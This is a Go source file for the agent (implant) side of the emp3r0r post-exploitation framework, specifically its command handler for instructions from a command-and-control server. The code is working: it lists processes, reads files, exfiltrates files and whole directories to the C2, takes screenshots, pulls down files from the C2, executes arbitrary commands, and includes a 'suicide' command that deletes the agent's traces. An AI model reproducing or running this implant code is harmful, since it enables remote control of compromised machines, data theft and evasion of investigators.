package agent

import (
	"bytes"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/otiai10/copy"
	"github.com/spf13/pflag"
)

// exec cmd, receive data, etc
func processCCData(data *emp3r0r_def.MsgTunData) {
	var (
		data2send emp3r0r_def.MsgTunData
		out       string
		err       error
	)
	data2send.Tag = RuntimeConfig.AgentTag

	payloadSplit := strings.Split(data.Payload, emp3r0r_def.MagicString)
	if len(payloadSplit) <= 1 {
		log.Printf("Cannot parse CC command: %s, wrong OpSep (should be %s) maybe?",
			data.Payload, emp3r0r_def.MagicString)
		return
	}
	cmd_id := payloadSplit[len(payloadSplit)-1]

	// command from CC
	keep_running := strings.HasSuffix(payloadSplit[1], "&") // ./program & means keep running in background
	cmd_str := strings.TrimSuffix(payloadSplit[1], "&")
	cmdSlice := util.ParseCmd(cmd_str)
	if len(cmdSlice) == 0 {
		log.Printf("Cannot parse CC command: %s", strconv.Quote(cmd_str))
		return
	}

	// parse command-line arguments using pflag
	flags := pflag.NewFlagSet(cmdSlice[0], pflag.ContinueOnError)
	log.Printf("Got command %s with args: %v", cmdSlice[0], cmdSlice)

	// send response to CC
	sendResponse := func(resp string) {
		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s",
			emp3r0r_def.MagicString,
			strings.Join(cmdSlice, " "),
			emp3r0r_def.MagicString,
			resp)
		data2send.Payload += emp3r0r_def.MagicString + cmd_id // cmd_id for cmd tracking
		if err = Send2CC(&data2send); err != nil {
			log.Println(err)
		}
		log.Printf("Response sent: %s", resp)
	}
	out = "Command failed"

	if strings.HasPrefix(cmdSlice[0], "!") {
		out = C2CommandsHandler(cmdSlice)
		sendResponse(out)
		return
	}

	// handle commands
	switch cmdSlice[0] {
	case "ps":
		// Usage: ps
		// Lists all running processes.
		pid := flags.IntP("pid", "p", 0, "PID to check")
		name := flags.StringP("name", "n", "", "Process name to check")
		user := flags.StringP("user", "u", "", "User to check")
		cmdLine := flags.StringP("cmdline", "c", "", "Command line to check")
		flags.Parse(cmdSlice[1:])
		out, err = ps(*pid, *user, *name, *cmdLine)
		if err != nil {
			out = fmt.Sprintf("Failed to ps: %v", err)
			break
		}
	case "cat":
		// Usage: cat --dst <file>
		// Reads the contents of the specified file.
		file_to_read := flags.StringP("dst", "d", "", "File to read")
		flags.Parse(cmdSlice[1:])
		if *file_to_read == "" {
			out = fmt.Sprintf("error: no file specified: %v", cmdSlice)
			break
		}

		out, err = util.DumpFile(*file_to_read)
		if err != nil {
			out = fmt.Sprintf("%v: %s", err, out)
			break
		}
	case "kill":
		// Usage: kill --pid <pid>...
		// Kills the specified processes.
		out, err = shellKill(cmdSlice[2:]) // skip "kill" and "--pid"
		if err != nil {
			out = fmt.Sprintf("Failed to kill: %v", err)
			break
		}
	case "net_helper":
		// Usage: net_helper
		// Displays network information.
		out = shellNet()
	case "get":
		// Usage: get --file_path <file_path> --offset <offset> --token <token>
		// Downloads a file from the agent starting at the specified offset.
		log.Printf("get: %v", cmdSlice)
		file_path := flags.StringP("file_path", "f", "", "File path to download")
		filter := flags.StringP("filter", "r", "", "Regex filter for file names to download")
		offset := flags.Int64P("offset", "o", 0, "Offset to start downloading from")
		token := flags.StringP("token", "t", "", "Token for the download")
		flags.Parse(cmdSlice[1:])
		log.Printf("Parsed: '%s' %d '%s'", *file_path, *offset, *token)
		if *file_path == "" || *offset < 0 || *token == "" {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			break
		}
		log.Printf("File download: %s at %d with token %s", *file_path, *offset, *token)
		if util.IsDirExist(*file_path) {
			// directory, return a list of files to download
			log.Printf("Downloading directory %s recursively", *file_path)
			var re *regexp.Regexp
			if *filter != "" {
				// parse regex
				re, err = regexp.Compile(*filter)
				if err != nil {
					out = fmt.Sprintf("Invalid regex filter: %v", err)
					break
				}
				log.Printf("Filtering files with %s", strconv.Quote(*filter))
			}
			file_list := []string{}
			err = filepath.Walk(*file_path, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return err
				}
				if !info.IsDir() {
					if re != nil && !re.MatchString(info.Name()) {
						return nil
					}
					file_list = append(file_list, path)
					log.Printf("Found file '%s' to download", path)
				}
				return nil
			})
			if err != nil {
				out = fmt.Sprintf("Error: failed to walk directory %s: %v", *file_path, err)
				break
			}
			if len(file_list) == 0 {
				out = fmt.Sprintf("Error: no files found in %s", *file_path)
				break
			}
			out = strings.Join(file_list, "\n")
			break
		} else {
			// single file
			err = sendFile2CC(*file_path, *offset, *token)
			if err != nil {
				out = fmt.Sprintf("Error: failed to send file %s: %v", *file_path, err)
				break
			}
		}
		out = fmt.Sprintf("Success: %s has been sent, please check", *file_path)
		if err != nil {
			log.Printf("get: %v", err)
			out = *file_path + err.Error()
			break
		}
	case "screenshot":
		// Usage: screenshot
		// Takes a screenshot and sends the file path to CC.
		if len(cmdSlice) != 1 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			break
		}
		out, err = Screenshot()
		if err != nil || out == "" {
			out = fmt.Sprintf("Error: failed to take screenshot: %v", err)
			break
		}
		// move to agent root
		err = os.Rename(out, RuntimeConfig.AgentRoot+"/"+out)
		if err == nil {
			out = RuntimeConfig.AgentRoot + "/" + out
		}
	case "suicide":
		// Usage: suicide
		// Deletes all agent files and exits.
		if len(cmdSlice) != 1 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			break
		}
		err = os.RemoveAll(RuntimeConfig.AgentRoot)
		if err != nil {
			log.Println("Failed to cleanup files")
		}
		log.Println("Exiting...")
		os.Exit(0)
	case "ls":
		// Usage: ls --dst <directory>
		// Lists the contents of the specified directory.
		target_dir := flags.StringP("dst", "d", ".", "Directory to list")
		flags.Parse(cmdSlice[1:])
		if flags.NArg() > 0 {
			*target_dir = flags.Arg(0)
		}
		log.Printf("Listing %s", *target_dir)
		out, err = util.LsPath(*target_dir)
		if err != nil {
			out = err.Error()
		}
	case "rm":
		// Usage: rm --dst <path>
		// Removes the specified file or directory.
		path := flags.StringP("dst", "d", "", "Path to remove")
		flags.Parse(cmdSlice[1:])
		if *path == "" {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			break
		}
		out = "Deleted " + *path
		if err = os.RemoveAll(*path); err != nil {
			out = fmt.Sprintf("Failed to delete %s: %v", *path, err)
		}
	case "mkdir":
		// Usage: mkdir --dst <path>
		// Creates a directory at the specified path.
		path := flags.StringP("dst", "d", "", "Path to create")
		flags.Parse(cmdSlice[1:])
		if *path == "" {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			break
		}
		out = "Mkdir " + *path
		if err = os.MkdirAll(*path, 0o700); err != nil {
			out = fmt.Sprintf("Failed to mkdir %s: %v", *path, err)
		}
	case "cp":
		// Usage: cp --src <source> --dst <destination>
		// Copies a file or directory from source to destination.
		src := flags.StringP("src", "s", "", "Source path")
		dst := flags.StringP("dst", "d", "", "Destination path")
		flags.Parse(cmdSlice[1:])
		if *src == "" || *dst == "" {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			break
		}
		out = fmt.Sprintf("%s has been copied to %s", *src, *dst)
		if err = copy.Copy(*src, *dst); err != nil {
			out = fmt.Sprintf("Failed to copy %s to %s: %v", *src, *dst, err)
		}
	case "mv":
		// Usage: mv --src <source> --dst <destination>
		// Moves a file or directory from source to destination.
		src := flags.StringP("src", "s", "", "Source path")
		dst := flags.StringP("dst", "d", "", "Destination path")
		flags.Parse(cmdSlice[1:])
		if *src == "" || *dst == "" {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			break
		}
		out = fmt.Sprintf("%s has been moved to %s", *src, *dst)
		if err = os.Rename(*src, *dst); err != nil {
			out = fmt.Sprintf("Failed to move %s to %s: %v", *src, *dst, err)
		}
	case "cd":
		// Usage: cd --dst <path>
		// Changes the current working directory to the specified path.
		path := flags.StringP("dst", "d", "", "Path to change to")
		flags.Parse(cmdSlice[1:])
		out = "cd error: no path specified"
		if *path == "" {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			break
		}
		cdPath, err := filepath.Abs(*path)
		if err != nil {
			out = fmt.Sprintf("cd error: %v", err)
			break
		}
		err = os.Chdir(cdPath)
		if err != nil {
			out = fmt.Sprintf("cd error: %v", err)
		} else {
			out = cdPath
		}
	case "pwd":
		// Usage: pwd
		// Prints the current working directory.
		if flags.NArg() != 0 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			break
		}
		pwd, err := os.Getwd()
		if err != nil {
			log.Println("processCCData: cant get pwd: ", err)
			pwd = err.Error()
		}
		out = "current working directory: " + pwd
	case "put":
		// Usage: put --file <file> --path <destination> --size <size> --checksum <checksum>
		// Downloads a file from CC to the specified path on the agent.
		file_to_download := flags.StringP("file", "f", "", "File to download")
		path := flags.StringP("path", "p", "", "Destination path")
		size := flags.Int64P("size", "s", 0, "Size of the file")
		orig_checksum := flags.StringP("checksum", "c", "", "Checksum of the file")
		download_addr := flags.StringP("addr", "h", "", "Agent to download from")
		flags.Parse(cmdSlice[1:])
		if *file_to_download == "" || *path == "" || *size == 0 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			break
		}
		_, err = SmartDownload(*download_addr, *file_to_download, *path, *orig_checksum)
		if err != nil {
			out = fmt.Sprintf("processCCData: cant download %s: %v", *file_to_download, err)
			break
		}
		// checksum
		checksum := tun.SHA256SumFile(*path)
		downloadedSize := util.FileSize(*path)
		out = fmt.Sprintf("%s has been uploaded successfully, sha256sum: %s", *path, checksum)
		if downloadedSize < *size {
			out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, *size, checksum)
		}
	case "exec":
		// exec cmd using os/exec normally, sends stdout and stderr back to CC
		if runtime.GOOS == "windows" {
			if !strings.HasSuffix(cmdSlice[0], ".exe") {
				cmdSlice[0] += ".exe"
			}
		}
		cmdStr := flags.StringP("cmd", "c", "", "Command to execute")
		flags.Parse(cmdSlice[1:])
		if *cmdStr == "" {
			out = "exec: empty command"
			break
		}
		args := util.ParseCmd(*cmdStr)
		cmd := exec.Command(args[0], args[1:]...)
		var out_bytes []byte
		out_buf := bytes.NewBuffer(out_bytes)
		cmd.Stdout = out_buf
		cmd.Stderr = out_buf
		err = cmd.Start()
		if err != nil {
			log.Println(err)
			out = fmt.Sprintf("%s\n%v", out_buf.Bytes(), err)
		} else {
			// kill process after 10 seconds
			// except when & is appended
			if !keep_running {
				cmd.Wait()
			}
			go func() {
				for i := 0; i < 10; i++ {
					time.Sleep(time.Second)
				}
				if !keep_running && util.IsPIDAlive(cmd.Process.Pid) {
					err = cmd.Process.Kill()
					out = fmt.Sprintf("Killing %d, which has been running for more than 10s, status %v",
						cmd.Process.Pid, err)
					sendResponse(out)
					return
				}
			}()
		}
		out = out_buf.String()
		if keep_running {
			out = fmt.Sprintf("%s running in background, PID is %d",
				cmdSlice, cmd.Process.Pid)
		}
	default:
	}

	defer sendResponse(out)
}
